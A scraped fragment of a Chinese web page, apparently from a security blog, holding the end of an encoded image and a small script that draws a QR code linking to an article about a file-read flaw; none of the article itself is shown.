lxhv6sCYIFzzz7benxSYe6Y+WrAmcfJnCK4BDmXA47UdCkoia1cs6Yeb3CNoX+B4rdSBNWCsLe4bUk/jBfwxkEzvCh7tGzxxYEiATz+dMNdkX6Pxbye88Dc1gXKymoB5DeXBPGwovho4V7n4WkeWuCK4TvlqVTMGUsnbf94JTAMBTxFmPNpmpn2Ur3y0wspXXzkZHO8B5hyYSy9Yx0Ak4/8TDzxustaNDdEFB1wPe6ylR33DC6eB1Aa3//MncA/k58/8dMVvHYiuXAx8dbN654GkBgKPbxshUiPsXOKK0lWrOfk1F1+8LDF4DzD/u7t0R5b6jlUP7g3H+K0DqYvf/tdO4FsGAp543UJ/UmDWVH31wVrYMP3AXOKK4FztVX1wHo6x9qu11Y+mclf8K3XfMpArm7k1105gGkimuMKjltGu8uCnMZqK4BwYa677q96f5WrP1IZLfIbgfZ5pei79heB6+Uc2DaQ3vOOfPYExEPD04GP8yhbBfa/UgrWwYa+DLQf289R17SqOFlwbDTiGDZMLgnPpIUzuKwjuB9x/l/X2Yh/jhrzYvv7Z7fwPAAD//w4xQvoAAAAGSURBVAMA6fFmp9IGhlEAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 